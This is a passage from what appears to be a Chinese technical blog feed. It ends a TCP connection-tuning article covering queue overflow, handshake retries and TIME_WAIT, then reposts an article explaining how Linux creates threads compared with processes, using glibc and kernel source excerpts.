就能保证不会有因为半连接队列满而发生的丢包。</p><p>对于全连接队列来说，可以通过 netstat -s 来观察。netstat -s 可查看到当前系统全连接队列满导致的丢包统计。但该数字记录的是总丢包数，所以你需要再借助 watch 命令动态监控。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># watch &#x27;netstat -s | grep overflowed&#x27; </span><br><span class="hljs-number">160</span> times the listen queue of a socket overflowed //全连接队列满导致的丢包<br></code></pre></td></tr></table></figure><p>如果输出的数字在你监控的过程中变了，那说明当前服务器有因为全连接队列满而产生的丢包。你就需要加大你的全连接队列的⻓度了。全连接队列是应用程序调用 listen时传入的 backlog 以及内核参数 net.core.somaxconn 二者之中较小的那个。如果需要加大，可能两个参数都需要改。</p><p>如果你手头并没有服务器的权限，只是发现自己的客户端机连接某个 server 出现耗时长，想定位一下是否是因为握手队列的问题。那也有间接的办法，可以 tcpdump 抓包查看是否有 SYN 的 TCP Retransmission。如果有偶发的 TCP Retransmission， 那就说明对应的服务端连接队列可能有问题了。</p><h3 id="建议13：减少握手重试"><a href="#建议13：减少握手重试" class="headerlink" title="建议13：减少握手重试"></a><strong>建议13：减少握手重试</strong></h3><p>在 6.5 节我们看到如果握手发生异常，客户端或者服务端就会启动超时重传机制。这个超时重试的时间间隔是翻倍地增长的，1 秒、3 秒、7 秒、15 秒、31 秒、63 秒 ……。对于我们提供给用户直接访问的接口来说，重试第一次耗时 1 秒多已经是严重影响用户体验了。如果重试到第三次以后，很有可能某一个环节已经报错返回 504 了。所以在这种应用场景下，维护这么多的超时次数其实没有任何意义。倒不如把他们设置的小一些，尽早放弃。 其中客户端的 syn 重传次数由 tcp_syn_retries 控制，服务器半连接队列中的超时次数是由 tcp_synack_retries 来控制。把它们两个调成你想要的值。</p><h3 id="建议14：-如果请求频繁，请弃用短连接改用长连接"><a href="#建议14：-如果请求频繁，请弃用短连接改用长连接" class="headerlink" title="建议14： 如果请求频繁，请弃用短连接改用长连接"></a><strong>建议14： 如果请求频繁，请弃用短连接改用长连接</strong></h3><p>如果你的服务器频繁请求某个 server，比如 redis 缓存。和建议 1 比起来，一个更好一点的方法是使用长连接。这样的好处有</p><p>1）<strong>节约了握手开销</strong>。短连接中每次请求都需要服务和缓存之间进行握手，这样每次都得让用户多等一个握手的时间开销。</p><p>2）<strong>规避了队列满的问题</strong>。前面我们看到当全连接或者半连接队列溢出的时候，服务器直接丢包。而客户端呢并不知情，所以傻傻地等 3 秒才会重试。要知道 tcp 本身并不是专门为互联网服务设计的。这个 3 秒的超时对于互联网用户的体验影响是致命的。</p><p>3）<strong>端口数不容易出问题</strong>。端连接中，在释放连接的时候，客户端使用的端口需要进入 TIME_WAIT 状态，等待 2 MSL的时间才能释放。所以如果连接频繁，端口数量很容易不够用。而长连接就固定使用那么几十上百个端口就够用了。</p><h3 id="建议15：TIME-WAIT-的优化"><a href="#建议15：TIME-WAIT-的优化" class="headerlink" title="建议15：TIME_WAIT 的优化"></a><strong>建议15：TIME_WAIT 的优化</strong></h3><p>很多线上服务如果使用了短连接的情况下，就会出现大量的 TIME_WAIT。</p><p>首先，我想说的是没有必要见到两三万个 TIME_WAIT 就恐慌的不行。从内存的⻆度来考虑，一条 TIME_WAIT 状态的连接仅仅是 0.5 KB 的内存而已。从端口占用的角度来说，确实是消耗掉了一个端口。但假如你下次再连接的是不同的 Server 的话，该端口仍然可以使用。只有在所有 TIME_WAIT 都聚集在和一个 Server 的连接上的时候才会有问题。</p><p>那怎么解决呢? 其实办法有很多。第一个办法是按上面建议开启端口 reuse 和 recycle。 第二个办法是限制 TIME_WAIT 状态的连接的最大数量。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># vi /etc/sysctl.conf</span><br>net.ipv4.tcp_max_tw_buckets = <span class="hljs-number">32768</span><br><span class="hljs-comment"># sysctl -p</span><br></code></pre></td></tr></table></figure><p>如果再彻底一些，也可以干脆直接用⻓连接代替频繁的短连接。连接频率大大降低以后，自然也就没有 TIME_WAIT 的问题了。</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>linux</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux中线程和进程到底有啥区别？</title>
    <link href="/2023/03/18/Linux%E4%B8%AD%E7%BA%BF%E7%A8%8B%E5%92%8C%E8%BF%9B%E7%A8%8B%E5%88%B0%E5%BA%95%E6%9C%89%E5%95%A5%E5%8C%BA%E5%88%AB%EF%BC%9F/"/>
    <url>/2023/03/18/Linux%E4%B8%AD%E7%BA%BF%E7%A8%8B%E5%92%8C%E8%BF%9B%E7%A8%8B%E5%88%B0%E5%BA%95%E6%9C%89%E5%95%A5%E5%8C%BA%E5%88%AB%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux中线程和进程到底有啥区别？"><a href="#Linux中线程和进程到底有啥区别？" class="headerlink" title="Linux中线程和进程到底有啥区别？"></a>Linux中线程和进程到底有啥区别？</h1><blockquote><p>主要内容转载自张彦飞的<a href="https://zhuanlan.zhihu.com/p/575360641">Linux中线程和进程到底有啥区别？</a></p></blockquote><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><h3 id="1-1-基本概念："><a href="#1-1-基本概念：" class="headerlink" title="1.1 基本概念："></a>1.1 基本概念：</h3><p>进程是对运行时程序的封装，是<strong>系统进行资源分配的基本单位，实现了操作系统的并发</strong>；</p><p>线程是进程的子任务，<strong>是CPU调度和执行的基本单位</strong>，<strong>用于保证程序的实时性，实现进程内部的并发；线程是操作系统可识别的最小执行和调度单位</strong>。每个线程都独自占用一个<strong>虚拟处理器</strong>：独自的<strong>寄存器组</strong>，<strong>指令计数器和处理器状态</strong>。每个线程完成不同的任务，但是<strong>共享同一地址空间</strong>（也就是同样的<strong>动态内存，映射文件，目标代码等等</strong>），<strong>打开的文件队列和其他内核资源</strong>。</p><h3 id="1-2-区别："><a href="#1-2-区别：" class="headerlink" title="1.2  区别："></a>1.2  区别：</h3><ol><li><strong>一个线程只能属于一个进程，而一个进程可以有多个线程</strong>，但至少有一个线程。线程依赖于进程而存在。 </li><li><strong>进程在执行过程中拥有独立的内存单元，而多个线程共享进程的内存</strong>。（资源分配给进程，同一进程的所有线程共享该进程的所有资源。同一进程中的多个线程共享代码段（代码和常量），数据段（全局变量和静态变量），扩展段（堆存储）。但是每个线程拥有自己的栈段，栈段又叫运行时段，用来存放所有局部变量和临时变量。） </li><li><strong>进程是资源分配的最小单位，线程是CPU调度的最小单位</strong>； </li><li>系统开销： 由于在创建或撤消进程时，系统都要为之分配或回收资源，如内存空间、I／o设备等。因此，操作系统所付出的开销将显著地大于在创建或撤消线程时的开销。类似地，在进行进程切换时，涉及到整个当前进程CPU环境的保存以及新被调度运行的进程的CPU环境的设置。而线程切换只须保存和设置少量寄存器的内容，并不涉及存储器管理方面的操作。可见，<strong>进程切换的开销也远大于线程切换的开销</strong>。 </li><li>通信：由于同一进程中的多个线程具有相同的地址空间，致使它们之间的同步和通信的实现，也变得比较容易。<strong>进程间通信IPC，线程间可以直接读写进程数据段（如全局变量）来进行通信——需要进程同步和互斥手段的辅助，以保证数据的一致性</strong>。在有的系统中，线程的切换、同步和通信都无须操作系统内核的干预 </li><li><strong>进程编程调试简单可靠性高，但是创建销毁开销大；线程正相反，开销小，切换速度快，但是编程调试相对复杂</strong>。 </li><li><strong>进程间不会相互影响 ；线程一个线程挂掉将导致整个进程挂掉</strong> </li><li><strong>进程适应于多核、多机分布；线程适用于多核</strong></li></ol><h2 id="二、线程的创建方法"><a href="#二、线程的创建方法" class="headerlink" title="二、线程的创建方法"></a><strong>二、线程的创建方法</strong></h2><p>在 Redis 6.0 以上的版本里，也开始支持使用多线程来提供核心服务，我们就以它为例。</p><p>在 Redis 主线程启动以后，会调用 initThreadedIO 来创建多个 io 线程。</p><blockquote><p>redis 源码地址：<a href="https://link.zhihu.com/?target=https://github.com/redis/redis">https://github.com/redis/redis</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:src/networking.c</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">initThreadedIO</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br> <span class="hljs-comment">//开始 io 线程的创建</span><br> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; server.io_threads_num; i++) &#123;<br>  <span class="hljs-type">pthread_t</span> tid;<br>  pthread_create(&amp;tid,<span class="hljs-literal">NULL</span>,IOThreadMain,(<span class="hljs-type">void</span>*)(<span class="hljs-type">long</span>)i)<br>  io_threads[i] = tid;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>创建线程具体调用的是 pthread_create 函数，pthread_create 是在 glibc 库中实现的。在 glibc 库中，pthread_create 函数的实现调用路径是 __pthread_create_2_1 -&gt; create_thread。 其中 create_thread 这个函数比较重要，它设置了创建线程时使用的各种 flag 标记。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:nptl/sysdeps/pthread/createthread.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">create_thread</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> pthread *pd, ...)</span><br>&#123;<br> <span class="hljs-type">int</span> clone_flags = (CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGNAL<br>    | CLONE_SETTLS | CLONE_PARENT_SETTID<br>    | CLONE_CHILD_CLEARTID | CLONE_SYSVSEM<br>    | <span class="hljs-number">0</span>);<br><br> <span class="hljs-type">int</span> res = do_clone (pd, attr, clone_flags, start_thread,<br>      STACK_VARIABLES_ARGS, <span class="hljs-number">1</span>);<br> ...<br>&#125;<br></code></pre></td></tr></table></figure><p>在上面的代码中，传入参数中的各个 flag 标记是非常关键的。这里我们先知道一下传入了 CLONE_VM、CLONE_FS、CLONE_FILES 等标记就行了，后面我们会讲内核中针对这些参数做的特殊处理。</p><p>接下来的 do_clone 最终会调用一段汇编程序，在汇编里进入 clone 系统调用，之后会进入内核中进行处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:sysdeps/unix/sysv/linux/i386/clone.S</span><br>ENTRY (BP_SYM (__clone))<br>...<br>movl$SYS_ify(clone),%eax<br>...<br></code></pre></td></tr></table></figure><h2 id="三、内核中对线程的表示"><a href="#三、内核中对线程的表示" class="headerlink" title="三、内核中对线程的表示"></a><strong>三、内核中对线程的表示</strong></h2><p>在开始介绍线程的创建过程之前，先给大家看看内核中表示线程的数据结构。</p><p>开篇的时候我说了，进程和线程的相同点要远远大于不同点。主要依据就是在 Linux 中，无论进程还是线程，都是抽象成了 task 任务，在源码里都是用 task_struct 结构来实现的。</p><p><img src="https://pic3.zhimg.com/80/v2-7420f4a28d3bff24222cac5257881a26_1440w.webp" alt="img"></p><p>我们来看 task_struct 具体的定义，它位于 include&#x2F;linux&#x2F;sched.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:include/linux/sched.h</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> &#123;</span><br> <span class="hljs-comment">//1.1 task状态 </span><br> <span class="hljs-keyword">volatile</span> <span class="hljs-type">long</span> state;<br><br> <span class="hljs-comment">//1.2 进程线程的pid</span><br> <span class="hljs-type">pid_t</span> pid;<br> <span class="hljs-type">pid_t</span> tgid;<br><br> <span class="hljs-comment">//1.3 task树关系：父进程、子进程、兄弟进程</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">parent</span>;</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">children</span>;</span> <br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">sibling</span>;</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">group_leader</span>;</span> <br><br> <span class="hljs-comment">//1.4 task调度优先级</span><br> <span class="hljs-type">int</span> prio, static_prio, normal_prio;<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> rt_priority;<br><br> <span class="hljs-comment">//1.5 地址空间</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>, *<span class="hljs-title">active_mm</span>;</span><br><br> <span class="hljs-comment">//1.6 文件系统信息（当前目录等）</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_struct</span> *<span class="hljs-title">fs</span>;</span><br><br> <span class="hljs-comment">//1.7 打开的文件信息</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">files_struct</span> *<span class="hljs-title">files</span>;</span><br><br> <span class="hljs-comment">//1.8 namespaces </span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nsproxy</span> *<span class="hljs-title">nsproxy</span>;</span><br><br> ...<br>&#125;<br></code></pre></td></tr></table></figure><p>这个数据结构已经在上一篇文章**<a href="https://link.zhihu.com/?target=https://mp.weixin.qq.com/s/ftrSkVvOr6s5t0h4oq4I2w">《Linux进程是如何创建出来的？》</a>**中，我们详细介绍过了。</p><p>对于线程来讲，所有的字段都是和进程一样的（本来就是一个结构体来表示的）。包括状态、pid、task 树关系、地址空间、文件系统信息、打开的文件信息等等字段，线程也都有。</p><p>这也就是我前面说的，进程和线程的相同点要远远大于不同点，本质上是同一个东西，都是一个 task_struct ！正因为进程线程如此之相像，所以在 Linux 下的线程还有另外一个名字，叫<strong>轻量级进程</strong>。至于说轻量在哪儿，稍后我们再说。</p><p>这里我们稍微说一下 pid 和 tgid 这两个字段。在 Linux 中，每一个 task_struct 都需要被唯一的标识，它的 pid 就是唯一标识号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:include/linux/sched.h</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> &#123;</span><br> ......<br> <span class="hljs-type">pid_t</span> pid;<br> <span class="hljs-type">pid_t</span> tgid;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于进程来说，这个 pid 就是我们平时常说的进程 pid。</p><p>对于线程来说，我们假如一个进程下创建了多个线程出来。那么每个线程的 pid 都是不同的。但是我们一般又需要记录线程是属于哪个进程的。这时候，tgid 就派上用场了，通过 tgid 字段来表示自己所归属的进程 ID。</p><p><img src="https://pic2.zhimg.com/80/v2-9a5b8790ceb5d17369bda8599974e575_1440w.webp" alt="img"></p><p>这样内核通过 tgid 可以知道线程属于哪个进程。</p><h2 id="四、线程创建过程"><a href="#四、线程创建过程" class="headerlink" title="四、线程创建过程"></a><strong>四、线程创建过程</strong></h2><p>要想知道进程和线程的区别到底在哪儿，我们从线程的创建过程来详细看一下。</p><h3 id="4-1-回顾进程创建"><a href="#4-1-回顾进程创建" class="headerlink" title="4.1 回顾进程创建"></a><strong>4.1 回顾进程创建</strong></h3><p>在**<a href="https://link.zhihu.com/?target=https://mp.weixin.qq.com/s/ftrSkVvOr6s5t0h4oq4I2w">《Linux进程是如何创建出来的？》</a>**一文中我们了解了进程的创建过程。 事实上，进程线程创建的时候，使用的函数看起来不一样。但实际在底层实现上，最终都是使用同一个函数来实现的。</p><p><img src="https://pic2.zhimg.com/80/v2-930b3d43e5e17d57d85168f74c595fa9_1440w.webp" alt="img"></p><p>我们再简单回顾一下创建进程时 fork 系统调用的源码，fork 调用主要就是执行了 do_fork 函数。<strong>注意：fork 函数调用 do_fork 的传的参数分别是SIGCHLD、0,0,NULL,NULL</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/fork.c</span><br>SYSCALL_DEFINE0(fork)<br>&#123;<br> <span class="hljs-keyword">return</span> do_fork(SIGCHLD, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>do_fork 函数又调用 copy_process 完成进程的创建。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/fork.c</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">do_fork</span><span class="hljs-params">(...)</span><br>&#123;<br> <span class="hljs-comment">//复制一个 task_struct 出来</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">p</span>;</span><br> p = copy_process(clone_flags, ...);<br> ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-2-线程的创建"><a href="#4-2-线程的创建" class="headerlink" title="4**.2 线程的创建**"></a>4**.2 线程的创建**</h3><p>我们在本文第一小节里介绍到 lib 库函数 pthread_create 会调用到 clone 系统调用，为其传入了一组 flag。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:nptl/sysdeps/pthread/createthread.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">create_thread</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> pthread *pd, ...)</span><br>&#123;<br> <span class="hljs-type">int</span> clone_flags = (CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGNAL<br>    | CLONE_SETTLS | CLONE_PARENT_SETTID<br>    | CLONE_CHILD_CLEARTID | CLONE_SYSVSEM<br>    | <span class="hljs-number">0</span>);<br><br> <span class="hljs-type">int</span> res = do_clone (pd, attr, clone_flags, ...);<br> ...<br>&#125;<br></code></pre></td></tr></table></figure><p>好，我们找到 clone 系统调用的实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/fork.c</span><br>SYSCALL_DEFINE5(clone, ......)<br>&#123;<br> <span class="hljs-keyword">return</span> do_fork(clone_flags, newsp, <span class="hljs-number">0</span>, parent_tidptr, child_tidptr);<br>&#125;<br></code></pre></td></tr></table></figure><p>同样，do_fork 函数还是会执行到 copy_process 来完成实际的创建。</p><h3 id="4-3-进程线程创建异同"><a href="#4-3-进程线程创建异同" class="headerlink" title="4.3 进程线程创建异同"></a><strong>4.3 进程线程创建异同</strong></h3><p>可见和创建进程时使用的 fork 系统调用相比，创建线程的 clone 系统调用几乎和 fork 差不多，也一样使用的是内核里的 do_fork 函数，最后走到 copy_process 来完整创建。</p><p>不过创建过程的<strong>区别是二者在调用 do_fork 时传入的 clone_flags 里的标记不一样！</strong>。</p><ul><li>创建进程时的 flag：仅有一个 SIGCHLD</li><li>创建线程时的 flag：包括 CLONE_VM、CLONE_FS、CLONE_FILES、CLONE_SIGNAL、CLONE_SETTLS、CLONE_PARENT_SETTID、CLONE_CHILD_CLEARTID、CLONE_SYSVSEM。</li></ul><p>关于这些 flag 的含义，我们选几个关键的做一个简单的介绍，后面介绍 do_fork 细节的时候会再次涉及到。</p><ul><li>CLONE_VM: 新 task 和父进程共享地址空间</li><li>CLONE_FS：新 task 和父进程共享文件系统信息</li><li>CLONE_FILES：新 task 和父进程共享文件描述符表</li></ul><p>这些 flag 会对 task_struct 产生啥影响，我们接着看接下来的内容。</p><h2 id="五、揭秘-do-fork-系统调用"><a href="#五、揭秘-do-fork-系统调用" class="headerlink" title="五、揭秘 do_fork 系统调用"></a><strong>五、揭秘 do_fork 系统调用</strong></h2><p>在本节中我们以动态的视角来看一下线程的创建过程.</p><p>前面我们看到，进程和线程创建都是调用内核中的 do_fork 函数来执行的。在 do_fork 的实现中，核心是一个 copy_process 函数，它以拷贝父进程（线程）的方式来生成一个新的 task_struct 出来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/fork.c</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">do_fork</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> clone_flags, ...)</span><br>&#123;<br> <span class="hljs-comment">//复制一个 task_struct 出来</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">p</span>;</span><br> p = copy_process(clone_flags, stack_start, stack_size,<br>    child_tidptr, <span class="hljs-literal">NULL</span>, trace);<br><br> <span class="hljs-comment">//子任务加入到就绪队列中去，等待调度器调度</span><br> wake_up_new_task(p);<br> ...<br>&#125;<br></code></pre></td></tr></table></figure><p>在创建完毕后，调用 wake_up_new_task 将新创建的任务添加到就绪队列中，等待调度器调度执行。这个代码很长，我对其进行了一定程度的精简。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/fork.c</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> task_struct *<span class="hljs-title function_">copy_process</span><span class="hljs-params">(...)</span><br>&#123;<br> <span class="hljs-comment">//4.1 复制进程 task_struct 结构体</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">p</span>;</span><br> p = dup_task_struct(current);<br> ...<br><br> <span class="hljs-comment">//4.2 拷贝 files_struct</span><br> retval = copy_files(clone_flags, p);<br><br> <span class="hljs-comment">//4.3 拷贝 fs_struct</span><br> retval = copy_fs(clone_flags, p);<br><br> <span class="hljs-comment">//4.4 拷贝 mm_struct</span><br> retval = copy_mm(clone_flags, p);<br><br> <span class="hljs-comment">//4.5 拷贝进程的命名空间 nsproxy</span><br> retval = copy_namespaces(clone_flags, p);<br><br> <span class="hljs-comment">//4.6 申请 pid &amp;&amp; 设置进程号</span><br> pid = alloc_pid(p-&gt;nsproxy-&gt;pid_ns);<br> p-&gt;pid = pid_nr(pid);<br> p-&gt;tgid = p-&gt;pid;<br> <span class="hljs-keyword">if</span> (clone_flags &amp; CLONE_THREAD)<br>  p-&gt;tgid = current-&gt;tgid;<br><br> ......<br>&#125;<br></code></pre></td></tr></table></figure><p>可见，copy_process 先是复制了一个新的 task_struct 出来，然后调用 copy_xxx 系列的函数对 task_struct 中的各种核心对象进行拷贝处理，还申请了 pid 。接下来我们分小节来查看该函数的每一个细节。</p><h3 id="5-1-复制-task-struct-结构体"><a href="#5-1-复制-task-struct-结构体" class="headerlink" title="5.1 复制 task_struct 结构体"></a><strong>5.1 复制 task_struct 结构体</strong></h3><p>注意一下，上面调用 dup_task_struct 时传入的参数是 current，它表示的是当前任务。在 dup_task_struct 里，会申请一个新的 task_struct 内核对象，然后将当前任务复制给它。需要注意的是，这次拷贝只会拷贝 task_struct 结构体本身，它内部包含的 mm_struct 等成员不会被复制。</p><p><img src="https://pic2.zhimg.com/80/v2-167941fd17dbe4319e55186356a7f8f1_1440w.webp" alt="img"></p><p>我们来简单看下具体的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/fork.c</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> task_struct *<span class="hljs-title function_">dup_task_struct</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *orig)</span><br>&#123;<br> <span class="hljs-comment">//申请 task_struct 内核对象</span><br> tsk = alloc_task_struct_node(node);<br> <span class="hljs-comment">//复制 task_struct</span><br> err = arch_dup_task_struct(tsk, orig);<br> ...<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 alloc_task_struct_node 用于在 slab 内核内存管理区中申请一块内存出来。关于 slab 机制请参考- <strong><a href="https://link.zhihu.com/?target=https://mp.weixin.qq.com/s/OR2XB4J76haGc1THeq7WQg">内核内存管理</a></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/fork.c</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">task_struct_cachep</span>;</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> task_struct *<span class="hljs-title function_">alloc_task_struct_node</span><span class="hljs-params">(<span class="hljs-type">int</span> node)</span><br>&#123;<br> <span class="hljs-keyword">return</span> kmem_cache_alloc_node(task_struct_cachep, GFP_KERNEL, node);<br>&#125;<br></code></pre></td></tr></table></figure><p>申请完内存后，调用 arch_dup_task_struct 进行内存拷贝。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/fork.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">arch_dup_task_struct</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *dst,</span><br><span class="hljs-params">         <span class="hljs-keyword">struct</span> task_struct *src)</span><br>&#123;<br> *dst = *src;<br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-2-拷贝打开文件列表"><a href="#5-2-拷贝打开文件列表" class="headerlink" title="5.2 拷贝打开文件列表"></a><strong>5.2 拷贝打开文件列表</strong></h3><p>我们先回忆一下前面的内容，创建线程调用 clone 系统调用的时候，传入了一堆的 flag，其中有一个就是 CLONE_FILES。如果传入了 CLONE_FILES 标记，就会复用当前进程的打开文件列表 - files 成员。</p><p><img src="https://pic1.zhimg.com/80/v2-f6e3f224df396e03dc3bf31c57e30c10_1440w.webp" 